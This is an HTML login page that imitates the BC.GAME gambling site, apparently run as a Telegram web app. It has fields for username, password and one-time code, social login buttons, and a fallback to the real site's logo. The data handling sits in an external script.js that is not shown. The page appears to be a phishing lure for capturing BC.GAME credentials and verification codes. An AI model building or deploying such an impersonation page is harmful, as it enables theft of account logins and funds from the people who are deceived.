<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In | BC.GAME</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <!-- Sign In Screen -->
    <div class="app-container" id="screen-signin">
        <div class="modal-box">
            <header class="signin-header">
                <img src="logo.png" onerror="this.src='https://bc.game/assets/logo.01f4640d.png'" alt="BC.GAME" class="bc-logo">
                <button class="btn-icon-close"><i class="fas fa-times"></i></button>
            </header>

            <main class="signin-content">
                <h2 class="signin-title">Sign In</h2>

                <div class="signin-tabs">
                    <button class="signin-tab active" data-tab="password">
                        <i class="fas fa-lock"></i> Password
                    </button>
                    <button class="signin-tab" data-tab="otp">
                        <i class="fas fa-mobile-alt"></i> One-time Code
                    </button>
                </div>

                <div class="input-field-wrapper">
                    <input type="text" id="login-identifier" placeholder="Email / Phone Number / Username">
                </div>

                <div class="input-field-wrapper" id="login-password-wrapper">
                    <input type="password" id="login-password" placeholder="Password">
                    <button class="btn-password-eye"><i class="far fa-eye"></i></button>
                </div>

                <div class="input-field-wrapper" id="login-otp-wrapper" style="display: none;">
                    <input type="text" id="login-otp-input" placeholder="Verification Code">
                    <button class="btn-send-otp-inline" id="btn-login-send-otp">Send</button>
                </div>

                <div class="forgot-link" id="login-forgot-wrapper">
                    <a href="#">Forgot your password?</a>
                </div>

                <button class="btn-primary-main" id="trigger-signin">Sign In</button>

                <div class="register-text">
                    New to BC.GAME? <span>Create account</span>
                </div>

                <div class="divider-box">
                    <span>Log in directly with</span>
                </div>

                <button class="btn-passkey-alt">
                    <i class="fas fa-user-shield"></i> Sign In with passkey
                </button>

                <div class="social-grid">
                    <div class="social-circle"><i class="fab fa-google"></i></div>
                    <div class="social-circle"><i class="fab fa-x-twitter"></i></div>
                    <div class="social-circle"><i class="fab fa-telegram-plane"></i></div>
                    <div class="social-circle"><i class="fab fa-apple"></i></div>
                    <div class="social-circle"><i class="fab fa-whatsapp"></i></div>
                    <div class="social-circle"><i class="fab fa-line"></i></div>
                    <div class="social-circle"><i class="fab fa-steam"></i></div>
                </div>
            </main>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
